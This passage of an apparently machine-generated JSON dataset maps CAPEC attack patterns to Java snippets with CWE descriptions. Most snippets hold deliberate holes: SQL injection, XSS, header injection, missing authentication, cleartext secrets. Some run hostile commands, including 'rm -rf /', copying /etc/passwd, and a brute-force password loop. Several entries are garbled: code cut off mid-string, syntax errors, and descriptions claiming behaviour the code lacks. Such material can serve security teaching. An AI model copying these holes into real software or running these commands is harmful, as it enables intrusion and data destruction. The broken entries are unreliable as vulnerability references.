        "code_snippet": "public class DeadlockExample {\n    private static Object lock1 = new Object();\n    private static Object lock2 = new Object();\n\n    public static void main(String[] args) {\n        Thread t1 = new Thread(new Runnable() {\n            public void run() {\n                synchronized (lock1) {\n                    try {\n                        Thread.sleep(100);\n                    } catch (InterruptedException e) {\n                    }\n                    synchronized (lock2) {\n                        System.out.println(\"Thread 1 acquired lock2\");\n                    }\n                }\n            }\n        });\n\n        Thread t2 = new Thread(new Runnable() {\n            public void run() {\n                synchronized (lock2) {\n                    try {\n                        Thread.sleep(100);\n                    } catch (InterruptedException e) {\n                    }\n                    synchronized (lock1) {\n                        System.out.println(\"Thread 2 acquired lock1\");\n                    }\n                }\n            }\n        });\n\n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a deadlock condition, where two threads (t1 and t2) are competing for locks on two objects (lock1 and lock2). Each thread acquires a lock, waits for a short period, and then attempts to acquire the other lock. This creates a deadlock situation, as each thread is waiting for the other to release the lock, resulting in a denial of service."
    },
    {
        "capec_id": "26",
        "code_snippet": "public class RaceConditionExample {\n    private static String fileContent = \"\";\n    private static boolean isFileAccessed = false;\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                fileContent = \"Malicious content\";\n                isFileAccessed = true;\n            }\n        });\n\n        Thread thread2 = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                while (!isFileAccessed) {\n                    if (new File(\"example.txt\").exists()) {\n                        try {\n                            fileContent = new String(Files.readAllBytes(Paths.get(\"example.txt\")));\n                        } catch (IOException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                }\n                System.out.println(fileContent);\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability, where two threads concurrently access and modify a shared resource (a file). The first thread (thread1) replaces the original file with a malicious version, while the second thread (thread2) reads the file content. Due to the lack of proper synchronization, there is a timing window where thread2 may read the malicious file content, leading to unexpected behavior. This code embodies the CAPEC and CWEs, including CWE-362, CWE-363, CWE-366, and CWE-662."
    },
    {
        "capec_id": "27",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\n\npublic class SymlinkRaceCondition {\n    public static void main(String[] args) {\n        String targetFile = \"/etc/passwd\";\n        String tempFile = \"/tmp/tempfile\";\n        String symlinkFile = \"/tmp/symlink\";\n\n        // CWE-61: UNIX Symbolic Link (Symlink) Following\n        // Create a symbolic link to the target file\n        try {\n            Runtime.getRuntime().exec(\"ln -s \" + targetFile + \" \" + symlinkFile);\n        } catch (IOException e) {\n            System.out.println(\"Error creating symlink: \" + e.getMessage());\n        }\n\n        // CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition\n        // Check if the temporary file exists\n        File temp = new File(tempFile);\n        if (!temp.exists()) {\n            try {\n                // CWE-689: Permission Race Condition During Resource Copy\n                // Create the temporary file with the same name as the symlink\n                temp.createNewFile();\n            } catch (IOException e) {\n                System.out.println(\"Error creating temp file: \" + e.getMessage());\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Symlink race condition attack. It creates a symbolic link to a sensitive file (/etc/passwd) and then tries to create a temporary file with the same name as the symlink. If the attacker can create the symlink during the interval between the check and the creation of the temporary file, they can write malicious content to the sensitive file."
    },
    {
        "capec_id": "28",
        "code_snippet": "import java.util.Scanner;\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.PreparedStatement;\nimport java.sql.SQLException;\n\npublic class FuzzingAttack {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter SQL query:\");\n        String userInput = scanner.nextLine();\n        String query = \"SELECT * FROM users WHERE name = '\" + userInput + \"';\";\n\n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"root\", \"password\")) {\n            PreparedStatement pstmt = conn.prepareStatement(query);\n            pstmt.executeQuery();\n        } catch (SQLException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a fuzzing attack, which can lead to CWE-74: Injection, CWE-20: Improper Input Validation, CWE-506: Embedded Malicious Code, CWE-184: Incomplete List of Disallowed Inputs, and CWE-209: Generation of Error Message Containing Sensitive Information. The code takes user input and constructs a SQL query without proper validation or sanitization, making it vulnerable to SQL injection attacks. The error message also contains sensitive information about the environment."
    },
    {
        "capec_id": "29",
        "code_snippet": "public class TOCTOUExample {\n    public static void main(String[] args) {\n        String filePath = \"/path/to/file\";\n        if (checkFilePermissions(filePath)) {\n            // Time-of-check Time-of-use (TOCTOU) Race Condition\n            // An attacker can replace the file between the check and the use\n            useFile(filePath);\n        }\n    }\n\n    private static boolean checkFilePermissions(String filePath) {\n        // Check if the file exists and has the correct permissions\n        return new File(filePath).canRead();\n    }\n\n    private static void useFile(String filePath) {\n        // Use the file, assuming it has the correct permissions\n        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\n            String line;\n            while ((line = br.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            System.err.println(\"Error reading file: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Time-of-check Time-of-use (TOCTOU) Race Condition (CWE-367) vulnerability. The `checkFilePermissions` method checks if a file exists and has the correct permissions, but an attacker can replace the file between the check and the use in the `useFile` method, causing the program to behave unexpectedly. This is an example of the CAPEC, where the adversary can leverage a file access race condition by modifying the resource between the time of check and the time of use."
    },
    {
        "capec_id": "30",
        "code_snippet": "public class HijackThread {\n    public static void main(String[] args) {\n        // CWE-270: Privilege Context Switching Error\n        Runtime.getRuntime().exec(\"chmod 777 /tmp/malicious_code\");\n\n        // CWE-114: Process Control\n        String maliciousCode = \"rm -rf /\";\n        Runtime.getRuntime().exec(maliciousCode);\n\n        // CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n        Thread thread = new Thread(new Runnable() {\n            public void run() {\n                try {\n                    // CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n                    Process p = Runtime.getRuntime().exec(\"/bin/sh -c 'echo \" + System.getProperty(\"user.name\") + \" > /tmp/owned'\");\n                    p.waitFor();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }\n        });\n        thread.start();\n\n        // CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n        // This is a hypothetical example, as it's not possible to directly access microarchitectural structures in Java\n        // However, it demonstrates the concept of exposing sensitive information\n        String sensitiveData = \"top_secret_info\";\n        System.out.println(sensitiveData);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of hijacking a privileged thread of execution by injecting malicious code into a running process. It uses CWE-270 to switch to a privileged context, CWE-114 to execute malicious commands, CWE-362 to exploit a race condition, CWE-78 to inject malicious OS commands, and CWE-1421 to expose sensitive information."
    },
    {
        "capec_id": "31",
        "code_snippet": "public class VulnerableCookieHandler {\n    public void handleCookie(HttpServletRequest request, HttpServletResponse response) {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"userSession\")) {\n                    String sessionID = cookie.getValue();\n                    // CWE-565: No validation or integrity checking of the session ID\n                    // CWE-315: Cleartext storage of sensitive information in a cookie\n                    // CWE-539: Use of persistent cookies containing sensitive information\n                    // CWE-642: External control of critical state data\n                    authenticateUser(sessionID);\n                }\n            }\n        }\n    }\n\n    public void authenticateUser(String sessionID) {\n        // CWE-20: Improper input validation\n        // CWE-472: External control of assumed-immutable web parameter\n        // CWE-384: Session fixation\n        if (sessionID != null && sessionID.length() > 0) {\n            // Assume the user is authenticated\n            // CWE-602: Client-side enforcement of server-side security\n            // CWE-311: Missing encryption of sensitive data\n            // CWE-113: Improper neutralization of CRLF sequences in HTTP headers\n            // CWE-302: Authentication bypass by assumed-immutable data\n            // Perform sensitive operations\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable cookie handler that relies on unvalidated and unencrypted cookies to authenticate users and perform sensitive operations. It embodies the main idea of the CAPEC, which involves accessing, intercepting, and modifying HTTP cookies to impersonate users or manipulate server-side operations."
    },
    {
        "capec_id": "32",
        "code_snippet": "import javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"userInput\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body><h1>Hello, \" + userInput + \"!</h1></body></html>\");\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable servlet that is susceptible to cross-site scripting (XSS) attacks. It takes user input from an HTTP GET request query string and injects it directly into the HTML response without proper validation or encoding, allowing an attacker to inject malicious script code."
    },
    {
        "capec_id": "33",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpRequestSmuggling {\n    public static void main(String[] args) throws IOException {\n        URL url = new URL(\"http://example.com\");\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests\n        connection.setRequestMethod(\"POST\");\n        connection.setRequestProperty(\"Content-Length\", \"0\");\n        connection.setRequestProperty(\"Transfer-Encoding\", \"chunked\");\n\n        // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\n        connection.setRequestProperty(\"Host\", \"example.com\\r\\nX-Forwarded-For: 127.0.0.1\");\n\n        // CWE-918: Server-Side Request Forgery (SSRF)\n        connection.connect();\n        OutputStream outputStream = connection.getOutputStream();\n        outputStream.write(\"GET /internal/resource HTTP/1.1\\r\\nHost: internal.example.com\\r\\n\\r\\n\".getBytes());\n\n        // CWE-352: Cross-Site Request Forgery (CSRF)\n        connection.setRequestProperty(\"Referer\", \"http://attacker.com\");\n\n        // CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n        connection.setRequestProperty(\"Proxy-Authorization\", \"Basic dXNlcjpwYXNzd29yZA==\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of HTTP Request Smuggling, which involves exploiting inconsistencies in HTTP request parsing and interpretation by intermediary agents. The code includes vulnerabilities related to CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers), CWE-918 (Server-Side Request Forgery), CWE-352 (Cross-Site Request Forgery), and CWE-441 (Unintended Proxy or Intermediary). The code sends a malicious HTTP request to a backend server, potentially leading to unauthorized access or data tampering."
    },
    {
        "capec_id": "34",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String userInput = req.getParameter(\"input\");\n        String response = \"<html><body>\" + userInput + \"</body></html>\";\n        resp.setStatus(200);\n        resp.addHeader(\"Content-Type\", \"text/html\");\n        resp.addHeader(\"Set-Cookie\", \"sessionID=123456\" + userInput);\n        resp.getWriter().write(response);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable HTTP servlet that is susceptible to HTTP response splitting and injection attacks. The servlet takes user input from the 'input' parameter and injects it into the HTTP response without proper sanitization, allowing an attacker to inject malicious content, including CRLF sequences, into the response. This can lead to HTTP response splitting, where an attacker can inject a malicious HTTP response into the original response, potentially leading to unauthorized actions or data theft."
    },
    {
        "capec_id": "35",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\npublic class VulnerableConfigReader {\n    public static void main(String[] args) {\n        try {\n            File configFile = new File(\"config.properties\");\n            FileInputStream fis = new FileInputStream(configFile);\n            Properties props = new Properties();\n            props.load(fis);\n            String dbUrl = props.getProperty(\"db.url\");\n            String dbUser = props.getProperty(\"db.user\");\n            String dbPass = props.getProperty(\"db.pass\");\n            // Execute database query using the configuration\n            String query = \"SELECT * FROM users WHERE username='\" + dbUser + \"' AND password='\" + dbPass + \"'\";\n            // Assume a method executeQuery() that executes the query\n            executeQuery(query);\n        } catch (IOException e) {\n            System.out.println(\"Error reading configuration file: \" + e.getMessage());\n        }\n    }\n\n    public static void executeQuery(String query) {\n        // Assume a method that executes the query\n        // This method is vulnerable to SQL injection\n        System.out.println(\"Executing query: \" + query);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration reader that loads a properties file and uses the configuration to execute a database query. The code is vulnerable to code injection (CWE-94) and improper neutralization of directives (CWE-96) since it does not properly sanitize the input from the configuration file. An attacker can modify the configuration file to inject malicious code or manipulate the query to execute arbitrary SQL commands. Additionally, the code violates the principle of least privilege (CWE-272) since it does not drop elevated privileges after accessing the configuration file. The code also does not properly manage ownership of the configuration file (CWE-282) and does not prevent link following (CWE-59)."
    },
    {
        "capec_id": "36",
        "code_snippet": "public class AdminController {\n    public void deleteUser(String username) {\n        // No authentication or authorization checks\n        UserDAO.deleteUser(username);\n    }\n\n    public void createAdminUser(String username, String password) {\n        // No authentication or authorization checks\n        UserDAO.createAdminUser(username, password);\n    }\n\n    public void shutdownServer() {\n        // No authentication or authorization checks\n        ServerManager.shutdown();\n    }\n}\n\npublic class UserDAO {\n    public static void deleteUser(String username) {\n        // Direct access to database without authentication\n        String query = \"DELETE FROM users WHERE username = '\" + username + \"';\";\n        Database.executeUpdate(query);\n    }\n\n    public static void createAdminUser(String username, String password) {\n        // Direct access to database without authentication\n        String query = \"INSERT INTO users (username, password, role) VALUES ('\" + username + \"', '\" + password + \"', 'admin');\";\n        Database.executeUpdate(query);\n    }\n}\n\npublic class ServerManager {\n    public static void shutdown() {\n        // Direct access to system functionality without authentication\n        Runtime.getRuntime().exit(0);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of unauthorized access to interfaces or functionality. The AdminController class provides methods to delete users, create admin users, and shut down the server, but it does not perform any authentication or authorization checks. The UserDAO class provides direct access to the database without authentication, and the ServerManager class provides direct access to system functionality without authentication. This code is vulnerable to CWE-306 (Missing Authentication for Critical Function), CWE-693 (Protection Mechanism Failure), CWE-695 (Use of Low-Level Functionality), CWE-1242 (Inclusion of Undocumented Features or Chicken Bits), and CWE-862 (Missing Authorization)."
    },
    {
        "capec_id": "37",
        "code_snippet": "public class SensitiveDataExposure {\n    private String apiKey = \"my_secret_api_key\";\n    private String dbUsername = \"my_db_username\";\n    private String dbPassword = \"my_db_password\";\n\n    public void storeSensitiveDataInCleartext() {\n        // CWE-312: Cleartext Storage of Sensitive Information\n        String data = \"apiKey: \" + apiKey + \", dbUsername: \" + dbUsername + \", dbPassword: \" + dbPassword;\n        File file = new File(\"sensitive_data.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void storeSensitiveDataInCookie() {\n        // CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n        Cookie cookie = new Cookie(\"sensitive_data\", apiKey + \":\" + dbUsername + \":\" + dbPassword);\n        // ... set cookie in HTTP response\n    }\n\n    public void storeSensitiveDataInRegistry() {\n        // CWE-314: Cleartext Storage in the Registry\n        String registryKey = \"HKEY_CURRENT_USER\\\\Software\\\\MyApp\";\n        try {\n            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);\n            key.CreateSubKey(registryKey).SetValue(\"sensitive_data\", apiKey + \":\" + dbUsername + \":\" + dbPassword);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void storeSensitiveDataInExecutable() {\n        // CWE-318: Cleartext Storage of Sensitive Information in Executable\n        String executablePath = \"path/to/executable\";\n        try {\n            Files.write(Paths.get(executablePath), (apiKey + \":\" + dbUsername + \":\" + dbPassword).getBytes());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void reuseMemoryWithoutClearing() {\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        byte[] buffer = new byte[1024];\n        // ... use buffer to store sensitive data\n        // do not clear buffer before reusing\n        buffer = new byte[1024];\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of exposing sensitive data by storing it in cleartext in various locations, including files, cookies, registry, and executables, and reusing memory without clearing sensitive information. This code embodies CWEs 226, 312, 314, 315, and 318."
    },
    {
        "capec_id": "38",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.lang.reflect.Method;\n\npublic class VulnerableCode {\n    public static void main(String[] args) throws Exception {\n        // CWE-73: External Control of File Name or Path\n        String userInput = System.getProperty(\"user.input\");\n        File file = new File(userInput);\n        if (file.exists()) {\n            // CWE-426: Untrusted Search Path\n            System.setProperty(\"java.library.path\", file.getParent());\n            // CWE-427: Uncontrolled Search Path Element\n            System.load(file.getAbsolutePath());\n        }\n\n        // CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File\n        String dbPassword = \"password\";\n        String dbUrl = \"jdbc:mysql://localhost:3306/mydb\";\n        String driver = \"com.mysql.jdbc.Driver\";\n        Class.forName(driver);\n        java.sql.Connection conn = java.sql.DriverManager.getConnection(dbUrl, \"root\", dbPassword);\n\n        // CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n        String resourceName = userInput;\n        Class<?> clazz = Class.forName(resourceName);\n        Method method = clazz.getMethod(\"execute\", null);\n        method.invoke(null, null);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of attack where an adversary loads a malicious resource into a program's standard path. The code is vulnerable to multiple CWEs, including untrusted search path, uncontrolled search path element, external control of file name or path, J2EE misconfiguration, and improper control of resource identifiers. The code loads a user-input file into the system's library path, sets a plaintext database password, and invokes a user-input method, allowing an attacker to manipulate the search path and execute malicious components."
    },
    {
        "capec_id": "39",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends javax.servlet.http.HttpServlet {\n    protected void doPost(HttpServletRequest req, HttpServletResponse res) {\n        Cookie[] cookies = req.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (cookie.getName().equals(\"user_role\")) {\n                    String role = cookie.getValue();\n                    if (role.equals(\"admin\")) {\n                        // grant admin access\n                    }\n                }\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable servlet that relies on a cookie to determine the user's role. The cookie value is not validated or integrity-checked, making it vulnerable to tampering. An attacker can manipulate the cookie value to gain admin access, exploiting CWE-565 (Reliance on Cookies without Validation and Integrity Checking), CWE-315 (Cleartext Storage of Sensitive Information in a Cookie), and CWE-539 (Use of Persistent Cookies Containing Sensitive Information). The lack of authentication and authorization checks also makes it vulnerable to CWE-285 (Improper Authorization) and CWE-302 (Authentication Bypass by Assumed-Immutable Data)."
    },
    {
        "capec_id": "40",
        "code_snippet": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.util.Scanner;\n\npublic class TerminalExploit {\n    public static void main(String[] args) {\n        try {\n            Process process = Runtime.getRuntime().exec(\"/bin/bash\");\n            OutputStream outputStream = process.getOutputStream();\n            InputStream inputStream = process.getInputStream();\n\n            Scanner scanner = new Scanner(inputStream);\n            String command = \"cp /etc/passwd /tmp/\";\n            outputStream.write(command.getBytes());\n            outputStream.write(\\n);\n            outputStream.flush();\n\n            String result = scanner.nextLine();\n            System.out.println(result);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a terminal exploit where an attacker sends a malicious command to a target terminal device, hoping the target user will execute it with their privileges. The code uses Runtime.getRuntime().exec() to execute a bash shell, and then sends the command 'cp /etc/passwd /tmp/' to the shell, which copies the password file to a temporary directory. This code embodies CWE-77, CWE-214, CWE-78, CWE-114, and CWE-529, as it allows command injection, uses sensitive command-line arguments, and executes commands from an untrusted source."
    },
    {
        "capec_id": "41",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.Message;\nimport javax.mail.MessagingException;\nimport javax.mail.Session;\nimport javax.mail.Transport;\nimport javax.mail.internet.InternetAddress;\nimport javax.mail.internet.MimeMessage;\n\npublic class EmailHeaderInjection {\n    public static void main(String[] args) throws MessagingException {\n        Properties props = new Properties();\n        Session session = Session.getDefaultInstance(props, null);\n        MimeMessage message = new MimeMessage(session);\n\n        // CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences\n        message.setSubject(\"<script>alert('XSS')</script>\");\n\n        // CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\n        message.setFrom(new InternetAddress(\"attacker@example.com\" + \"\\\" -o -i -f response@example.com\"));\n\n        // CWE-697: Incorrect Comparison\n        if (message.getSubject().equals(\"<script>alert('XSS')</script>\")) {\n            // do something\n        }\n\n        // CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax\n        message.setHeader(\"X-Frame-Options\", \"ALLOW-FROM http://example.com\" + \"</script><script>alert('XSS')</script>\");\n\n        // CWE-116: Improper Encoding or Escaping of Output\n        message.setText(\"<a href='http://example.com'>Click me</a>\" + \"<script>alert('XSS')</script>\");\n\n        Transport.send(message);\n    }\n}",
        "description": "This Java code snippet demonstrates email header injection vulnerabilities. It sets the email subject to a script tag, injects an argument delimiter in the from address, performs an incorrect comparison, sets an HTTP header with scripting syntax, and sets the email text to an HTML link with a script tag. These vulnerabilities can lead to XSS attacks, command injection, and other security issues."
    },
    {
        "capec_id": "42",
        "code_snippet": "public class MIMEConverter {\n    public static void convertToMIME(byte[] input) {\n        byte[] output = new byte[1024];\n        System.arraycopy(input, 0, output, 0, input.length);\n        // No validation of input length or content\n        // No checking of output buffer size\n        String mimeType = getMimeTypeFromInput(input);\n        if (mimeType != null) {\n            // No neutralization of special elements in output\n            String command = \"mimetool -i \" + mimeType + \" -o output.mim\";\n            Runtime.getRuntime().exec(command);\n        }\n    }\n\n    private static String getMimeTypeFromInput(byte[] input) {\n        // Reliance on file name or extension of externally-supplied file\n        String fileName = getFileNameFromInput(input);\n        if (fileName.endsWith(\".txt\")) {\n            return \"text/plain\";\n        } else if (fileName.endsWith(\".jpg\")) {\n            return \"image/jpeg\";\n        } else {\n            return null;\n        }\n    }\n\n    private static String getFileNameFromInput(byte[] input) {\n        // Improper input validation\n        String fileName = new String(input);\n        return fileName;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable MIME conversion routine that can be exploited to cause a buffer overflow and gain control over the mail server machine. The code lacks input validation, allowing an attacker to provide a malicious input that can overflow the output buffer. The code also relies on the file name or extension of the externally-supplied file to determine the MIME type, and does not neutralize special elements in the output. This can lead to a buffer overflow and potentially allow an attacker to execute arbitrary commands on the mail server machine."
    },
    {
        "capec_id": "43",
        "code_snippet": "import java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class VulnerableParser {\n    public static void parseInput(String userInput) {\n        // CWE-179: Early validation\n        if (isValidInput(userInput)) {\n            // CWE-181: Validate before filter\n            String filteredInput = filterInput(userInput);\n            // CWE-77: Command injection\n            String command = \"echo \" + filteredInput + \" > output.txt\";\n            Runtime.getRuntime().exec(command);\n        }\n    }\n\n    private static boolean isValidInput(String input) {\n        // CWE-20: Improper input validation\n        // CWE-697: Incorrect comparison\n        return input.matches(\"^[a-zA-Z0-9]+$\");\n    }\n\n    private static String filterInput(String input) {\n        // CWE-184: Incomplete list of disallowed inputs\n        // CWE-183: Permissive list of allowed inputs\n        return input.replace(\"<\", \"&lt;\").replace(\">\", \"&gt;\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC-13 vulnerability, where an attacker can bypass input validation by layering special characters. The code has multiple CWEs, including early validation, validate before filter, command injection, improper input validation, incorrect comparison, incomplete list of disallowed inputs, and permissive list of allowed inputs."
    },
    {
        "capec_id": "44",
        "code_snippet": "public class VulnerableImageProcessor {\n    public void processImage(byte[] imageData) {\n        byte[] buffer = new byte[1024];\n        System.arraycopy(imageData, 0, buffer, 0, imageData.length);\n        // No check for buffer overflow\n        String fileType = getFileExtension(new String(buffer));\n        if (fileType.equals(\"jpg\")) {\n            // Process the image\n        } else {\n            // Handle other file types\n        }\n    }\n\n    private String getFileExtension(String fileName) {\n        int lastIndex = fileName.lastIndexOf('.');\n        if (lastIndex == -1) {\n            return \"\";\n        }\n        return fileName.substring(lastIndex);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable image processor that is susceptible to a buffer overflow attack. The processImage method copies the input image data into a fixed-size buffer without checking the size of the input data, leading to a classic buffer overflow (CWE-120). The method also relies on the file extension to determine the file type (CWE-646), which can be exploited by an attacker to cause the file to be misclassified. Additionally, the code does not properly handle alternate data streams (CWE-69) and performs an incorrect comparison (CWE-697) when checking the file type."
    },
    {
        "capec_id": "45",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class SymbolicLinkBufferOverflow {\n    public static void main(String[] args) {\n        try {\n            // CWE-285: Improper Authorization\n            if (System.getProperty(\\",
        "description": "This Java code snippet demonstrates a symbolic link buffer overflow attack. It lacks proper input validation, allowing an attacker to create a symbolic link with malicious contents. The code then reads the symbolic link contents into a fixed-size buffer without checking the size, leading to a buffer overflow. The contents are then printed to the console, potentially allowing an attacker to inject malicious data. The code also lacks proper authorization, allowing an attacker to bypass security checks."
    },
    {
        "capec_id": "46",
        "code_snippet": "public class VulnerableConfigParser {\n    public static void parseConfig(String config) {\n        String[] keyValuePairs = config.split(\"\\\\n\");\n        for (String pair : keyValuePairs) {\n            String[] keyValue = pair.split(\"=\");\n            if (keyValue.length == 2) {\n                String key = keyValue[0];\n                String value = keyValue[1];\n                // Vulnerable code: no input validation or size checking\n                byte[] buffer = new byte[1024];\n                System.arraycopy(value.getBytes(), 0, buffer, 0, value.length());\n                // ... process the buffer ...\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable configuration parser that is susceptible to a buffer overflow attack. The parseConfig method takes a string input representing a configuration file, splits it into key-value pairs, and then copies the value into a fixed-size byte array without checking the size of the input. This can lead to a buffer overflow if the input value is larger than the buffer size. The code also lacks input validation, making it vulnerable to injection attacks."
    },
    {
        "capec_id": "47",
        "code_snippet": "public class VulnerableCode {\n    public static void processInput(byte[] input) {\n        byte[] output = new byte[1024];\n        System.arraycopy(input, 0, output, 0, input.length);\n        // ... process the output buffer ...\n    }\n\n    public static void main(String[] args) {\n        byte[] userInput = new byte[2048];\n        // assume userInput is filled with user-provided data\n        processInput(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a classic buffer overflow vulnerability. The processInput method copies the user-provided input byte array to a fixed-size output buffer without checking the size of the input. If the input array is larger than the output buffer, a buffer overflow occurs. This code embodies CWE-120, CWE-119, CWE-118, CWE-130, and CWE-20. The main method provides an example of how user input can be passed to the vulnerable processInput method, increasing the likelihood of a buffer overflow."
    },
    {
        "capec_id": "48",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.net.URI;\nimport java.net.URISyntaxException;\n\npublic class FileAccessVulnerability {\n    public static void main(String[] args) {\n        String userInput = \\",
        "description": "This Java code snippet demonstrates a file access vulnerability, where a user-input string is used to access a local file without proper validation. The code uses the URI class to parse the user-input string, which can lead to CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page. The code then uses the File class to access the local file, which can lead to CWE-646: Reliance on File Name or Extension of Externally-Supplied File. The file contents are then sent to an attacker-controlled site using an HTTP GET request with sensitive query strings, which is a CWE-598: Use of GET Request Method With Sensitive Query Strings. The code also demonstrates CWE-241: Improper Handling of Unexpected Data Type, as it does not handle unexpected data types in the user-input string. Finally, the code demonstrates CWE-706: Use of Incorrectly-Resolved Name or Reference, as it uses a user-input string to access a local file without proper validation."
    },
    {
        "capec_id": "49",
        "code_snippet": "public class BruteForceAttack {\n    public static void main(String[] args) {\n        String[] passwords = {\n            \"password123\",\n            \"iloveyou\",\n            \"dragonball\",\n            \"letmein\",\n            \"monkey\",\n            \"shadow\",\n            \"sunshine\",\n            \"master\",\n            \"jesus\",\n            \"login\",\n            \"qwerty\",\n            \"123456\",\n            \"12345678\",\n            \"123456789\",\n            \"1234567890\",\n            \"abc123\",\n            \"baseball\",\n            \"football\",\n            \"letmein\",\n            \"michael\",\n            \"mustang\",\n            \"ninja\",\n            \"password\",\n            \"pokemon\",\n            \"princess\",\n            \"qazwsx\",\n            \"samsung\",\n            \"samsung123\",\n            \"shadow\",\n            \"solo\",\n            \"starwars\",\n            \"sunshine\",\n            \"superman\",\n            \"trustno1\",\n            \"welcome\",\n        };\n\n        for (String password : passwords) {\n            if (authenticateUser(\"username\", password)) {\n                System.out.println(\"Access granted with password: \" + password);\n                break;\n            }\n        }\n    }\n\n    public static boolean authenticateUser(String username, String password) {\n        // No password aging mechanism in place\n        // Passwords are stored in a recoverable format\n        // No restriction on excessive authentication attempts\n        // Single-factor authentication used\n        // No mechanism to prevent brute force attacks\n        return username.equals(\"username\") && password.equals(getStoredPassword());\n    }\n\n    public static String getStoredPassword() {\n        // Password stored in a recoverable format\n        return \"password123\";\n    }\n}",
        "description": "This Java code snippet demonstrates a brute force attack on a system with weak password requirements, no password aging mechanism, and single-factor authentication. The code tries a list of common passwords to gain access to the system, highlighting the vulnerabilities CWE-521, CWE-262, CWE-257, CWE-654, CWE-307, CWE-308, and CWE-309."
    },
    {
        "capec_id": "50",
